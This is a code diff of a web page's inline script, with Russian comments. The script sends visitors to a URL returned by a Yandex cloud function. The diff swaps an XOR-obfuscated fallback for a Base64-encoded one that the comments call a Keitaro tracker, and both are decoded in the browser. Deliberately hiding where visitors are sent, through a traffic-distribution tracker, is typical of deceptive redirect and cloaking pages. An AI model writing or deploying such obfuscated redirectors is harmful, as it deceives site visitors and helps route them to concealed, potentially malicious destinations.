@@ -52,19 +52,22 @@
             }, timeLeft);
         }
 
-        fetch(YANDEX_FUNCTION_URL)
+                fetch(YANDEX_FUNCTION_URL)
             .then(response => response.json())
             .then(data => {
-                redirectTo(data.url);
+                // Проверяем, что ссылка реально пришла
+                if (data && data.url && data.url !== "undefined" && data.url !== "null") {
+                    redirectTo(data.url);
+                } else {
+                    // Если Яндекс вернул пустоту, кидаем на Keitaro (Base64)
+                    const fallbackUrl = atob("aHR0cHM6Ly92b3hpdXMucnUvWXhjVm1iP189dmRmcmMyM2Y=");
+                    redirectTo(fallbackUrl);
+                }
             })
             .catch(error => {
-                // Если Яндекс упал, ведем на трекер с XOR-обфускацией
-                const _x = [109, 113, 113, 117, 118, 63, 42, 42, 115, 106, 125, 108, 112, 118, 43, 119, 112, 42, 92, 125, 102, 83, 104, 103, 58, 90, 56, 115, 97, 99, 119, 49, 55, 54, 99];
-                let _u = "";
-                for (let i = 0; i < _x.length; i++) {
-                    _u += String.fromCharCode(_x[i] ^ 5);
-                }
-                redirectTo(_u);
+                // Если Яндекс недоступен
+                const fallbackUrl = atob("aHR0cHM6Ly92b3hpdXMucnUvWXhjVm1iP189dmRmcmMyM2Y=");
+                redirectTo(fallbackUrl);
             });
     </script>
 </body>
